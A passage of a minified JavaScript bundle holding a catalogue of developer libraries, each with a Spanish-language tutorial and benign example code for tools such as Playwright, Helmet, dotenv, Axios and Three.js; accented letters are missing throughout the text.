      .toThrowError('Importe invlido');
  });
})
\`\`\`
`},{id:"playwright",name:"Playwright",packageName:"@playwright/test",version:"v1.37.0",description:"Testing end-to-end confiable para navegadores modernos. El estndar actual de la industria.",icon:b.jsx(Us,{className:"lib-icon"}),tags:["Testing","E2E","Automatizacin"],link:"https://playwright.dev/",guide:`
# Playwright - Control Mental sobre Navegadores

Creado por Microsoft, toma el control de Chrome, Firefox o Safari (automticamente instalados) y simula las acciones exactas del usuario, probando todo tu flujo web.

## Automatizacin Masiva

\`\`\`typescript
import { test, expect } from '@playwright/test';

test('Test de Compra Completa', async ({ page }) => {
  await page.goto('https://miapp.com/login');
  
  // Escribir en inputs
  await page.fill('#email', 'test@test.com');
  await page.fill('#password', 'secreta123');
  
  // Hacer clicks
  await page.click('button[type="submit"]');

  // Esperar a que la pgina cambie
  await expect(page).toHaveURL(/.*dashboard/);
  
  // Validar visualmente
  await expect(page.locator('.user-greeting')).toContainText('Bienvenido Test');
});
\`\`\`
`},{id:"cypress",name:"Cypress",packageName:"cypress",version:"v13.6.0",description:"Testing E2E para cualquier cosa que corra en un navegador. Extremadamente amigable para desarrolladores.",icon:b.jsx(Br,{className:"lib-icon"}),tags:["Testing","E2E","Frontend"],link:"https://www.cypress.io/",guide:`
# Cypress - E2E Visual y Guiado

Junto a Playwright, son los reyes E2E. Te levanta una interfaz visual hermosa en tu monitor donde puedes ver "paso a paso" cmo el bot controla tu pgina web y dnde explot exactamente si hubo un error.

## Prueba E2E Tpica
\`\`\`javascript
describe('E-Commerce: Flujo de Compra', () => {
  it('Agrega al carrito correctamente', () => {
    cy.visit('http://localhost:3000') // Entra a tu app local

    // Encuentra un producto y haz click
    cy.contains('Zapatillas Nike').click()
    
    // Validar estado de URL
    cy.url().should('include', '/products/nike-shoes')

    // Accin
    cy.get('button.add-to-cart').click()

    // Validar DOM interactivo
    cy.get('.cart-count').should('have.text', '1')
  })
})
\`\`\`
`},{id:"reacticons",name:"React Icons",packageName:"react-icons",version:"v4.10.0",description:"Acceso a miles de iconos de las libreras ms populares (FontAwesome, AntDesign, etc.) en un solo paquete.",icon:b.jsx(_o,{className:"lib-icon"}),tags:["Frontend","Iconos","UI"],link:"https://react-icons.github.io/react-icons/",guide:`
# React Icons - Tu Armera Grfica

Tener que investigar e instalar FontAwesome para un icono, Material Icons para otro, y Heroicons para otro es un infierno de dependencias. React Icons compila **TODAS las libreras de iconos del planeta** en un solo instalador.

## Uso Estndar
Al compilar, React usa *Tree Shaking*. Aunque tengas acceso a 10.000 iconos gratis, si solo importas uno, el usuario solo descargar el peso vectorizado de ese nico icono.

\`\`\`tsx
import { FaBeer } from 'react-icons/fa'; // FontAwesome
import { MdAlarm } from 'react-icons/md'; // Material Design
import { FiActivity } from 'react-icons/fi'; // Feather

export const Panel = () => {
    return (
        <div>
            <h3> Tomando una <FaBeer /> con alarma <MdAlarm /> </h3>
        </div>
    )
}
\`\`\`
`},{id:"clsx",name:"Clsx & Tailwind Merge",packageName:"clsx tailwind-merge",version:"v2.0.0",description:"La combinacin perfecta para manejar clases dinmicas en Tailwind sin conflictos.",icon:b.jsx(xd,{className:"lib-icon"}),tags:["Frontend","Estilos","Utilidades"],link:"https://github.com/lukeed/clsx",guide:`
# Clsx & Tailwind Merge - El Do Dinmico

Cuando empiezas a construir componentes reutilizables con Tailwind CSS, te das cuenta rpidamente de que mezclar "clases por defecto" con "clases condicionales" es un desastre creando strings largos.

## El Problema y la Solucin

Si tienes un botn y quieres que si la variable \`error\` es cierta, el botn sea rojo. Y adems quieres que la clase exterior pueda sobrescribir el tamao.

\`\`\`tsx
import { clsx, type ClassValue } from 'clsx'
import { twMerge } from 'tailwind-merge'

/** Funcin que une ambas libreras mgicamente (Comn en Shadcn/UI) */
export function cn(...inputs: ClassValue[]) {
  // clsx junta Strings/Objetos libremente
  // twMerge fusiona clases conflictivas de Tailwind (ej: pt-4 y py-2)
  return twMerge(clsx(inputs))
}

// Ahora escribir botones es limpio y sin conflictos:
<button className={cn(
   "bg-blue-500 rounded px-4", 
   isError && "bg-red-500", 
   userCustomClass
)}>
\`\`\`
`},{id:"datefns",name:"date-fns",packageName:"date-fns",version:"v3.3.1",description:"Librera de utilidades de fechas JS moderna, modular y rpida. Alternativa robusta a moment.js.",icon:b.jsx(Br,{className:"lib-icon"}),tags:["Utilidades","Frontend","Backend"],link:"https://date-fns.org/",guide:`
# date-fns - Fechas sin Dolor de Cabeza

Tradicionalmente los devs usaban la masiva librera \`moment.js\`, pero era pesada y difcil de optimizar. \`date-fns\` es el equivalente moderno, escrito completamente en funciones puras e independientes.

## Casos de Uso Diarios

Manipular el objeto \`Date\` de JavaScript nativo suele ser frustrante (por zonas horarias y formato).

\`\`\`javascript
import { format, formatDistance, formatRelative, subDays } from 'date-fns'
import { es } from 'date-fns/locale' // Soporte multilenguaje

// Dar formato legible
format(new Date(), "dd 'de' MMMM 'de' yyyy", { locale: es })
// => "25 de Febrero de 2026"

// Saber cunto tiempo pas (estilo Facebook/Twitter)
formatDistance(subDays(new Date(), 3), new Date(), { addSuffix: true, locale: es })
// => "hace 3 das"

// Formato relativo
formatRelative(subDays(new Date(), 3), new Date(), { locale: es })
// => "el domingo pasado a las 20:23"
\`\`\`
`},{id:"helmet",name:"Helmet",packageName:"helmet",version:"v7.0.0",description:"Asegura tus aplicaciones Express configurando varios headers HTTP. Imprescindible en produccin.",icon:b.jsx(Qr,{className:"lib-icon"}),tags:["Backend","Seguridad"],link:"https://helmetjs.github.io/",guide:`
# Helmet - Tu Escudo Backend

Helmet no es un framework, es un middleware vital (14 funciones pequeas) que configura las cabeceras HTTP (Headers) de tu servidor de NodeJS para protegerte de ataques web comunes sin que t tengas que ser experto en ciberseguridad.

## De qu te protege?
*   **X-Powered-By:** Oculta que usas Express (para evitar ataques especficos a esa tecnologa).
*   **CSP (Content Security Policy):** Evita ataques de Cross-Site Scripting controlando desde dnde tu app puede cargar scripts e imgenes.
*   **Clickjacking:** Impide que sitos maliciosos envuelvan tu pgina en un iframe invisible.

## Uso (literalmente 2 lneas)
\`\`\`javascript
const express = require('express');
const helmet = require('helmet');

const app = express();

// Agrega 14 capas de seguridad de golpe
app.use(helmet());
\`\`\`
`},{id:"nodemailer",name:"Nodemailer",packageName:"nodemailer",version:"v6.9.4",description:"La forma ms sencilla de enviar correos electrnicos desde Node.js. Soporta Unicode y adjuntos.",icon:b.jsx(pc,{className:"lib-icon"}),tags:["Backend","Utilidades"],link:"https://nodemailer.com/",guide:`
# Nodemailer - El Cartero de NodeJS

La librera estndar, 100% segura y libre de dolores de cabeza para enviar emails usando SMTP genrico, Gmail, Outlook o servicios de nube (SendGrid/Mailgun).

## Uso Clsico (Ej. Recuperar Contrasea)

\`\`\`javascript
const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  host: "smtp.tudominio.com",
  port: 465,
  secure: true,
  auth: { user: "admin@tusitio.com", pass: "tu_password123" }
});

const sendMail = async () => {
  const info = await transporter.sendMail({
    from: '"El Jefe" <admin@tusitio.com>', // Quien manda
    to: "usuario@gmail.com", // Quien recibe
    subject: "Has recuperado tu clave",
    html: "<b>Hola! Haz click aqui para recuperar.</b>",
  });
  console.log("Mensaje enviado: %s", info.messageId);
}
\`\`\`
`},{id:"flask",name:"Flask",packageName:"Flask",version:"v2.3",description:"Microframework de Python ligero y modular, perfecto para APIs rpidas y prototipos.",icon:b.jsx(Jn,{className:"lib-icon"}),tags:["Python","Backend"],link:"https://flask.palletsprojects.com/",guide:`
# Flask - El Micro-Backend

Antes de que FastAPI existiera, Flask era el rey indiscutible para hacer APIs rpidas en Python. A diferencia de Django (que te impone una estructura de 20 carpetas), Flask te permite tener un servidor web completo funcional en un solo archivo de 5 lneas de cdigo.

## Hola Mundo en 5 lneas
\`\`\`python
from flask import Flask
app = Flask(__name__)

@app.route("/")
def hola():
    return "Hola Mundo desde el Puerto 5000"

if __name__ == "__main__":
    app.run()
\`\`\`
`},{id:"dotenv",name:"Dotenv",packageName:"dotenv",version:"v16.3.0",description:"Carga variables de entorno desde un archivo .env. Crucial para la seguridad y configuracin.",icon:b.jsx(Qr,{className:"lib-icon"}),tags:["Backend","Configuracin","Utilidades"],link:"https://github.com/motdotla/dotenv",guide:`
# Dotenv - Secretos a Salvo

Exponer contraseas de bases de datos o tokens de APIs (como los de OpenAI o Stripe) en tu cdigo subido a GitHub es el peor error de seguridad posible. Dotenv soluciona esto obligndote a crear un archivo \`.env\` que GitHub ignorar.

## Uso Crtico
En el archivo \`.env\` de tu computadora:
\`\`\`env
DB_PASSWORD=super_secreta_123
STRIPE_KEY=sk_test_12345
\`\`\`

En tu cdigo NodeJS devuelves esos valores secretos de forma segura:
\`\`\`javascript
require('dotenv').config()

// La contrasea ahora est oculta en la variable global Process env
const password = process.env.DB_PASSWORD;
\`\`\`
`},{id:"axios",name:"Axios",packageName:"axios",version:"v1.5.0",description:"Cliente HTTP basado en promesas que funciona igual de bien en el navegador y Node.js.",icon:b.jsx(Us,{className:"lib-icon"}),tags:["Frontend","Backend","HTTP"],link:"https://axios-http.com/",guide:`
# Axios - El Fetch Superior

Aunque \`fetch()\` es nativo en el navegador y en versiones recientes de Node, Axios sigue siendo inmensamente popular porque soluciona todas las fricciones de trabajar con APIs en una sola librera que pesa poqusimo.

## Qu ventajas tiene sobre nativo?
1. **Transforma JSON automtico:** (Con fetch tienes que hacer \`response.json()\` en otra lnea manual).
2. **Interceptors:** Necesitas inyectar el Token Bearer a TODAS las 80 peticiones HTTP que hace tu app? Con Axios lo haces globalmente en 1 solo archivo.
3. **Manejo de Errores elegante:** Con fetch, un error 404 de servidor te dar \`ok: falso\` pero no lanzar un bloque \`catch\`! Axios tira un Catch automticamente para respuestas http de la familia 400 y 500.

## Instancia Global con Token

\`\`\`javascript
import axios from 'axios';

const api = axios.create({
  baseURL: 'https://api.mipropiositio.com/v1',
  timeout: 5000,
});

// Interceptor inyectando JWT en cada peticin sin que te acuerdes
api.interceptors.request.use((config) => {
    config.headers.Authorization = \`Bearer \${localStorage.getItem('token')}\`;
    return config;
});

// En tus componentes
const usuarios = await api.get('/usuarios'); // JSON listo para usar
\`\`\`
`},{id:"dayjs",name:"Day.js",packageName:"dayjs",version:"v1.11.9",description:"Alternativa minimalista a Moment.js con la misma API. Solo 2KB de peso.",icon:b.jsx(Br,{className:"lib-icon"}),tags:["Utilidades","Frontend","Backend"],link:"https://day.js.org/",guide:`
# Day.js - El Reemplazo de Moment

Day.js toma todo el diseo de API de la legendaria (y pesada) librera \`moment.js\`, pero la reduce a ridculos **2KB**. Es la alternativa perfecta cuando necesitas funciones avanzadas de fechas pero \`date-fns\` te parece muy diferente a lo habitual.

## La API que ya conoces
Si sabas usar Moment, ya sabes usar Day.js.

\`\`\`javascript
import dayjs from 'dayjs'

// Manipulacin y encadenamiento (chaining)
dayjs('2018-08-08')
  .add(1, 'year')
  .subtract(2, 'months')
  .format('DD/MM/YYYY') 
  // => "08/06/2019"

// Comparacin
const isAfter = dayjs('2010-10-20').isAfter('2010-10-19') // true
\`\`\`
`},{id:"recharts",name:"Recharts",packageName:"recharts",version:"v2.8.0",description:"Librera de grficos rediseada para React y construida con SVG, ideal para dashboards.",icon:b.jsx(_o,{className:"lib-icon"}),tags:["Frontend","Visualizacin","UI"],link:"https://recharts.org/",guide:`
# Recharts - Grficos Reactivos

Construir grficos estadsticos desde cero es un dolor de cabeza matemtico masivo. Recharts envuelve estas operaciones en componentes declarativos y limpios de React construidos bajo D3.js.

## Creando un Grfico de Lneas
Literalmente tomas un array de objetos JSON y tus grficas nacen con animaciones y tooltips incluidos:

\`\`\`tsx
import { LineChart, Line, XAxis, YAxis, CartesianGrid, Tooltip } from 'recharts';

const data = [
  { name: 'Ene', ventas: 400 },
  { name: 'Feb', ventas: 300 },
  { name: 'Mar', ventas: 500 }
];

export const VentasStats = () => (
  <LineChart width={400} height={400} data={data}>
    <Line type="monotone" dataKey="ventas" stroke="#8884d8" />
    <CartesianGrid stroke="#ccc" />
    <XAxis dataKey="name" />
    <YAxis />
    <Tooltip />
  </LineChart>
);
\`\`\`
`},{id:"authjs",name:"Auth.js",packageName:"next-auth",version:"v4.23.0",description:"La solucin completa para autenticacin en aplicaciones web modernas y Next.js.",icon:b.jsx(Qr,{className:"lib-icon"}),tags:["Backend","Seguridad","Auth"],link:"https://authjs.dev/",guide:`
# Auth.js (NextAuth) - Seguridad Completa

Implementar autenticacin (login con Google, Facebook, Apple, Emails Mgicos, JWTs, Sesiones de Base de Datos) desde cero toma semanas y es propenso a errores graves. Auth.js engloba todo esto.

## Estandarizacin Total
Originalmente nacido como NextAuth exclusivo para Next.js, ahora soporta Express, SvelteKit, etc.

\`\`\`tsx
import NextAuth from "next-auth"
import GithubProvider from "next-auth/providers/github"

export const authOptions = {
  // Configurado en literalmente 3 lneas
  providers: [
    GithubProvider({
      clientId: process.env.GITHUB_ID,
      clientSecret: process.env.GITHUB_SECRET,
    }),
  ],
}

export default NextAuth(authOptions)
\`\`\`
`},{id:"morgan",name:"Morgan",packageName:"morgan",version:"v1.10.0",description:"Middleware de registro de solicitudes HTTP para Node.js. El estndar para logs de servidor.",icon:b.jsx(pc,{className:"lib-icon"}),tags:["Backend","Utilidades","Logging"],link:"https://github.com/expressjs/morgan",guide:`
# Morgan - El Testigo HTTP

Cuando despliegas tu API NodeJS en la nube y algo falla, necesitas saber exactamente qu request HTTP (GET, POST), hacia qu ruta y con qu cdigo de estado fall. Morgan es el middleware que imprime (loggea) hermosamente cada peticin en la consola del servidor.

## Registro Visual
\`\`\`javascript
const express = require('express')
const morgan = require('morgan')
const app = express()

// Modo 'dev' colorea los estados HTTP: 
// Verdes (200), Rojos (500), Amarillos (400)
app.use(morgan('dev'))

app.get('/', function (req, res) {
  res.send('hello, world!')
})
// En consola vers: GET / 200 4.135 ms - 13
\`\`\`
`},{id:"sharp",name:"Sharp",packageName:"sharp",version:"v0.32.5",description:"Procesamiento de imgenes de alto rendimiento en alta velocidad para Node.js.",icon:b.jsx(_s,{className:"lib-icon"}),tags:["Backend","Utilidades","Imgenes"],link:"https://sharp.pixelplumbing.com/",guide:`
# Sharp - El Cuchillo de Imgenes

Si permites a los usuarios subir avatares a tu base de datos, algunos subirn BMPs de 25 MB que destruirn tu servidor y ancho de banda. Procesar imgenes en NodeJS usando JS nativo chupa el 100% de la CPU. Sharp soluciona esto usando bindings en C (libvips) para ser **4x a 5x ms rpido** que ImageMagick.

## Compresin y Redimensin Instantnea
\`\`\`javascript
const sharp = require('sharp');
const fs = require('fs');

// Toma una foto cruda de iPhone de 10MB y la convierte en 
// un WebP de 20kb, de 200x200 pxeles, recortando el centro exacto.
sharp('foto_gigante.jpg')
  .resize(200, 200, {
    fit: sharp.fit.cover,
    position: sharp.strategy.entropy
  })
  .webp({ quality: 80 })
  .toFile('avatar_optimizado.webp')
  .then(info => console.log('xito:', info))
  .catch(err => console.error('Error:', err));
\`\`\`
`},{id:"swr",name:"SWR",packageName:"swr",version:"v2.2.0",description:"Estrategia de obtencin de datos de Vercel: ligera, rpida y reactiva.",icon:b.jsx(Jn,{className:"lib-icon"}),tags:["Frontend","Estado","Sincronizacin"],link:"https://swr.vercel.app/",guide:`
# SWR - stale-while-revalidate

Creado por Vercel, es el competidor directo y elegante de React Query. Su nombre deriva de la estrategia de cach HTTP: primero devuelve los datos obsoletos (stale), luego hace la peticin de fondo (revalidate), y finalmente actualiza la UI con datos frescos.

## La Sintaxis Minimalista

\`\`\`tsx
import useSWR from 'swr'

// El fetcher le ensea a SWR CMO buscar datos (con la API fetch nativa, axios u otra)
const fetcher = (...args) => fetch(...args).then(res => res.json())

function PerfilUsuario() {
  const { data, error, isLoading } = useSWR('/api/user/123', fetcher)

  if (error) return <div>Fall la carga</div>
  if (isLoading) return <div>Cargando...</div>

  // Si hay datos, la interfaz es reactiva en tiempo real si el usuario cambia de pestaa
  return <div>Hola {data.name}!</div>
}
\`\`\`
`},{id:"nextjs",name:"Next.js",packageName:"next",version:"v14.0.0",description:"El framework de React para la web. Optimizacin automtica, SSR y rutas de API integradas.",icon:b.jsx(Us,{className:"lib-icon"}),tags:["Fullstack","React","SSR"],link:"https://nextjs.org/",guide:`
# Next.js - El Meta-Framework de React

React de forma nativa solo carga en el cliente (tu navegador primero descarga JavaScript y luego dibuja la web, creando una pantalla blanca inicial). Next.js resuelve ese y todos los problemas de escala.

## Caractersticas de Nivel Dios
1.  **Server Side Rendering (SSR):** El servidor dibuja la pgina y se la enva al usuario lista, resultando en SEO perfecto (los bots de Google aman Next.js) y velocidad extrema.
2.  **Rutas Automticas:** Ya no usas React Router Dom. Creas un archivo en la carpeta \`app/dashboard/page.tsx\` y automticamente tienes la ruta \`/dashboard\`.
3.  **App Router & Server Components:** En Next 14, los componentes se renderizan en el servidor por defecto de forma asncrona, conectando bases de datos en el mismo componente de UI.

## Componente "Server" Mgico
\`\`\`tsx
// app/usuarios/page.tsx
// Esto corre EN EL SERVIDOR (NodeJS), no expone variables a Chrome.

import db from '@/lib/db'

export default async function UsuariosPage() {
  // Peticin real directa a base de datos
  const users = await db.user.findMany()

  return (
    <ul>
      {users.map((u) => (
        <li key={u.id}>{u.name}</li>
      ))}
    </ul>
  )
}
\`\`\`
`},{id:"astro",name:"Astro",packageName:"astro",version:"v4.0.0",description:"Framework para sitios estticos ultra rpidos. Enva menos JavaScript al navegador.",icon:b.jsx(Jn,{className:"lib-icon"}),tags:["Frontend","Performance","Static"],link:"https://astro.build/",guide:`
# Astro - Velocidad Esttica Brutal

Astro es el framework "Zero-JS" (Cero JavaScript) por defecto. Naci por la frustracin de descargar 2MB de React al celular solo para mostrar un simple blog esttico de texto e imgenes.

## Islas Interactivas (Astro Islands)
Astro agarra todos tus componentes e intenta convertirlos en puro y ligero HTML tradicional. 

Si tienes una pgina donde el 90% es contenido esttico pero necesitas *solo* un carrusel interactivo en el medio, usas la directiva \`client:load\`.
De esta manera Astro sirve HTML puro y *nicamente* inyecta el JS estricto para encender esa pequea "isla" aislada.

## Componentes Multilenguaje 
Astro soporta mezclar React, Vue, Svelte y Tailwind... todo en la misma pgina web.
\`\`\`astro
---
// Importa cualquier librera y ejecuta lgica de lado servidor
import ReactHeader from '../components/ReactHeader.jsx';
import VueCounter from '../components/VueCounter.vue';
import SvelteForm from '../components/SvelteForm.svelte';
const res = await fetch('https://api.midominio.com/estrellas');
const stats = await res.json();
---

<html>
  <body>
    <!-- Server Side Rendering sin JS -->
    <ReactHeader title="Mix Global" />
    
    <!-- Componente Vue que cargar su JS al hacer scroll -->
    <VueCounter client:visible count={stats.count} />
    
    <!-- Componente Svelte esttico -->
    <SvelteForm />
  </body>
</html>
\`\`\`
`},{id:"tanstack-table",name:"TanStack Table",packageName:"@tanstack/react-table",version:"v8.10.0",description:'Librera "headless" para construir tablas y datagrids potentes con control total sobre el diseo.',icon:b.jsx(_o,{className:"lib-icon"}),tags:["Frontend","Tablas","Data"],link:"https://tanstack.com/table",guide:`
# TanStack Table - El Datagrid Libre

Las libreras de tablas tradicionales te inyectan TODO su CSS (Bootstrap, Material) forzndote a sus estilos. TanStack es "Headless" (sin cabeza): Ellos te dan toda la lgica salvaje (Paginacin, Filtros, Sorting masivo) y t solo pones los estilos divs o CSS.

## Poder Principal
* Cero diseo forzado. Puedes estilizar las 10,000 filas de la tabla con puro Tailwind a tu manera.
* Paginacin en servidor o cliente instantnea.
* Funciona en React, Vue, Solid y Vanilla JS por igual porque la lgica de datos est abstrada del render.
`},{id:"polars",name:"Polars",packageName:"polars",version:"v0.19.0",description:"Librera de procesamiento de datos ultrarrpida escrita en Rust. Alternativa de alto rendimiento a Pandas.",icon:b.jsx(Br,{className:"lib-icon"}),tags:["Python","Data Science","Rust"],link:"https://pola.rs/",guide:`
# Polars - El Asesino de Pandas

Por ms de una dcada, *Pandas* fue el rey absoluto del anlisis de datos en Python. Pero Pandas corre en un solo hilo (monocore) y se come la memoria RAM viva. Polars fue reescrito desde cero en **Rust**.

## Por qu usar Polars
*   **Multithreading:** Polars divide el trabajo en todos los ncleos de tu CPU automticamente. Algo que Pandas tardaba 10 minutos, Polars lo hace en 3 segundos.
*   **Evaluacin Perezosa (Lazy Evaluation):** Polars no ejecuta las tareas lnea por lnea. Analiza todo tu cdigo, "planea" la ruta ms rpida y eficiente, y luego ejecuta todo de golpe.
*   **API Elegante:** Su forma de hacer consultas (Queries) es ms intuitiva e inspirada en metodologas modernas.
`},{id:"langchain",name:"LangChain",packageName:"langchain",version:"v0.0.300",description:"Framework para construir aplicaciones potenciadas por LLMs (Modelos de Lenguaje Grandes).",icon:b.jsx(Zr,{className:"lib-icon"}),tags:["AI","Python","LLM"],link:"https://www.langchain.com/",guide:`
# LangChain - Orquestador de IAs

Si necesitas que ChatGPT lea un PDF, busque algo en Google y luego te escriba un resumen en un archivo .txt... la API de OpenAI no hace eso por s sola. LangChain existe para conectar la IA con las *Herramientas del mundo real*.

## Concepto RAG (Retrieval-Augmented Generation)
LangChain es famoso por hacer esto fcil:
1.  **Cargas** 10 libros tuyos en PDF.
2.  LangChain los **corta** en mil pedazos y los pasa a vectores (nmeros semnticos).
3.  Cuando el usuario hace una pregunta, LangChain busca el texto relevante, **lo inyecta en el Prompt**, y *luego* dispara ChatGPT.
`},{id:"pydantic",name:"Pydantic",packageName:"pydantic",version:"v2.4.0",description:"Validacin de datos y gestin de configuraciones para Python usando anotaciones de tipo.",icon:b.jsx(Qr,{className:"lib-icon"}),tags:["Python","Validacin","Backend"],link:"https://docs.pydantic.dev/",guide:`
# Pydantic - Tipado Estricto en Python

Si Zod salv a TypeScript de ser endeble, Pydantic salva a Python de sus caticos diccionarios. Transforma los tipos informales en una fuerte barrera inquebrantable.

## Enforzando el esquema
\`\`\`python
from datetime import datetime
from pydantic import BaseModel, PositiveInt

class User(BaseModel):
    id: int  
    name: str = 'John Doe'  
    signup_ts: datetime | None  
    friends: list[int] = []  

# Le pasamos un string en el ID y fecha mala
external_data = {
    'id': '123',
    'signup_ts': '2032-06-01 12:22',  
    'friends': [1, 2, '3'],  
}

# Pydantic automticamente convierte '123' a Nmero Entero 
# y la fecha a Objeto DateTime! Si no puede, explota protegiendo tu base de datos.
user = User(**external_data)
\`\`\`
`},{id:"socketcluster",name:"SocketCluster",packageName:"socketcluster",version:"v17.0.0",description:"Servidor WebSockets y framework pub/sub altamente escalable para multicore.",icon:b.jsx(pc,{className:"lib-icon"}),tags:["Real-time","WebSockets","Backend"],link:"https://socketcluster.io/",guide:`
# SocketCluster - WebSockets en Mltiples Ncleos

WebSockets (Socket.io) es maravilloso para chats en tiempo real. Pero NodeJS corre en un solo ncleo. Si tu juego en vivo se vuelve viral y recibe 100,000 conexiones, Socket.io explotar tu nico ncleo. SocketCluster fue construido por arquitectos de nube para escalar WebSockets infinitamente usando todos los ncleos del servidor (y mltiples servidores).

## Canales Pub/Sub
En lugar de mandar mensajes "uno a uno", la gente se suscribe a canales (Ej: "Bitcoin", "Chat-Global").

\`\`\`javascript
// En el Cliente (Navegador)
(async () => {
  let canalBitcoin = socket.subscribe('precio_btc');
  
  // Escucha el canal para siempre
  for await (let data of canalBitcoin) {
    console.log('El precio cambi a:', data.precio);
  }
})();
\`\`\`
`},{id:"rxjs",name:"RxJS",packageName:"rxjs",version:"v7.8.1",description:"Librera fundamental de reactividad para programar eventos asncronos mediante streams observables.",icon:b.jsx(Br,{className:"lib-icon"}),tags:["Lgica","Frontend","Async"],link:"https://rxjs.dev/",guide:`
# RxJS - Reactividad Pura

Manejar asincrona en JavaScript suele hacerse con Promesas (\`async/await\`). Pero una promesa es una operacin de "un solo uso" (esperas los datos del servidor y listo). Qu pasa si tienes un flujo *constante* de datos, como clics de mouse o datos en tiempo real?

RxJS usa **Observables** para tratar eventos extenuantes en el tiempo como si fueran simples Arreglos a los que les puedes hacer map, filter y reduce.

## Controlando el Caos del Autocompletar
\`\`\`javascript
import { fromEvent } from 'rxjs';
import { debounceTime, map, distinctUntilChanged } from 'rxjs/operators';

const inputBuscador = document.getElementById('searchBox');

// En vez de un addEventListener catico:
fromEvent(inputBuscador, 'input')
  .pipe(
    map(evento => evento.target.value), // Extrae el texto
    debounceTime(500),                  // Espera medio segundo de silencio
    distinctUntilChanged()              // Ignora si el texto es igual al anterior
  )
  .subscribe(texto_final => {
    // Solo llama a la API bajo tus estrictas reglas
    fetchAPI(texto_final);
  });
\`\`\`
`},{id:"commander",name:"Commander.js",packageName:"commander",version:"v11.1.0",description:"La solucin completa y preferida por Node.js para desarrollar herramientas eficientes de CLI.",icon:b.jsx(_s,{className:"lib-icon"}),tags:["Terminal","Backend","Node.js"],link:"https://github.com/tj/commander.js/",guide:`
# Commander.js - Tu Propio CLI

Si alguna vez has usado herramientas como \`git add\` o \`npm install\`, sabes lo tiles que son las herramientas de lnea de comandos. Commander.js es el framework dominante para construir tus propias herramientas profesionales usando NodeJS.

## Creando un Comando
Si tienes una tarea repetitiva (Ej: Crear carpetas con archivos de configuracin para cada proyecto nuevo), convirtelo en un comando oficial:

\`\`\`javascript
const { program } = require('commander');

program
  .name('mi-herramienta')
  .description('Herramienta PRO para hacer scaffolding de proyectos')
  .version('1.0.0');

// Comando: mi-herramienta crear miblog --rapido
program.command('crear')
  .argument('<nombre>', 'el nombre de tu proyecto')
  .option('-r, --rapido', 'omite la instalacin de dependencias')
  .action((nombre, opciones) => {
    console.log(\`Creando proyecto \${nombre}...\`);
    if(opciones.rapido) console.log('(Modo rpido activado)');
  });

program.parse();
\`\`\`
`},{id:"faker",name:"Faker.js",packageName:"@faker-js/faker",version:"v8.4.1",description:"Genera cantidades enormes de datos falsos de usuarios, correos, avatars e IPs en el navegador o backend.",icon:b.jsx(_o,{className:"lib-icon"}),tags:["Testing","Database","Utilidades"],link:"https://fakerjs.dev/",guide:`
# Faker.js - Creador de Mundos Falsos

Imagina que ests construyendo una tabla de usuarios o probando tu nueva API. No puedes insertar "test1", "test2" 100 veces a mano. Tampoco quieres usar datos reales de clientes de la base de datos de produccin por seguridad. Faker genera miles de datos "crebles" en milisegundos.

## Generacin Masiva
\`\`\`javascript
import { faker } from '@faker-js/faker';

export function crearUsuarioFake() {
  return {
    id: faker.string.uuid(),
    avatar: faker.image.avatar(),
    nombre: faker.person.fullName(),
    email: faker.internet.email(),
    biografia: faker.person.bio(),
    ultimo_login: faker.date.recent(),
    tarjeta: faker.finance.creditCardNumber()
  };
}

// Genera 50 usuarios con nombre, foto real y tarjeta en 1 lnea
const listaUsuarios = Array.from({ length: 50 }, crearUsuarioFake);
\`\`\`
`},{id:"threejs",name:"Three.js",packageName:"three",version:"r160",description:"La inmensa y dominante biblioteca para renderizar asombrosos grficos y animaciones 3D WebGL en el navegador.",icon:b.jsx(Zr,{className:"lib-icon"}),tags:["Frontend","Animacin","WebGL"],link:"https://threejs.org/",guide:`
# Three.js - El Metaverso en el Navegador

Utilizar WebGL nativo en el navegador requiere cientos de lneas de matemticas complejas (matrices, shaders en lenguaje GLSL) solo para dibujar un tringulo en 3D. Three.js es la gran envoltura amigable que abstrae toda esa matemtica pesada, permitindote crear mundos, juegos y experiencias 3D espectaculares.

## Conceptos Core
1.  **Scene (Escena):** El universo vaco donde pones las cosas.
2.  **Camera (Cmara):** Los ojos virtuales a travs de los cuales miras la escena.
3.  **Renderer (Dibujador):** El motor que calcula la luz y pinta los pxeles en el \`<canvas>\` de tu HTML a 60 FPS.
4.  **Mesh (Malla):** Un objeto 3D. Se compone de un **Geometry** (forma/esqueleto) y un **Material** (piel, pintura, reflexin).

## Ejemplo Bsico
\`\`\`javascript
import * as THREE from 'three';

const scene = new THREE.Scene();
const camera = new THREE.PerspectiveCamera(75, 16/9, 0.1, 1000);
const renderer = new THREE.WebGLRenderer();

// Creamos un Cubo Verde Mgico
const geometry = new THREE.BoxGeometry();
const material = new THREE.MeshBasicMaterial({ color: 0x00ff00 });
const cube = new THREE.Mesh(geometry, material);

scene.add(cube);
camera.position.z = 5;

// Loop de Animacin Inagotable
function animate() {
	requestAnimationFrame(animate);
	cube.rotation.x += 0.01;
	cube.rotation.y += 0.01;
	renderer.render(scene, camera);
}
animate();
\`\`\`
`},{id:"beautifulsoup",name:"Beautiful Soup",packageName:"beautifulsoup4",version:"v4.12.3",description:"Una icnica y gil librera de Python para extraer maravillosamente datos en web scraping desde HTML puros.",icon:b.jsx(Us,{className:"lib-icon"}),tags:["Python","Data Science","Web"],link:"https://beautiful-soup-4.readthedocs.io/",guide:`
# Beautiful Soup - El Cosechador de Datos

Cuando necesitas hacer Web Scraping (extraer informacin de una pgina web que no tiene API oficial), haces una peticin \`request\` o \`fetch\` a su URL. El problema es que te devuelven un string de texto gigantesco de puro cdigo HTML inentendible.

Beautiful Soup transforma esa cadena de texto asquerosa en un rbol navegable usando sintaxis muy parecida a jQuery o \`document.querySelector\`.

## Scrapeando Noticias Rpidamente
\`\`\`python
import requests
from bs4 import BeautifulSoup

# Obtenemos el HTML crudo
html_puro = requests.get('https://news.ycombinator.com/').text

# Creamos la "Sopa" amigable
sopa = BeautifulSoup(html_puro, 'html.parser')

# Extraemos MGICAMENTE todos los links con la clase "titleline"
noticias = sopa.find_all('span', class_='titleline')

for noticia in noticias:
    print(noticia.text)
\`\`\`
`},{id:"tesseract",name:"Tesseract.js",packageName:"tesseract.js",version:"v5.0.4",description:"Motor brutal y portado de Reconocimiento ptico de Caracteres (OCR) capaz de leer texto desde imgenes en JS.",icon:b.jsx(Jf,{className:"lib-icon"}),tags:["AI","Frontend","Utilidades"],link:"https://tesseract.projectnaptha.com/",guide:`
# Tesseract.js - Visin Artificial en JS

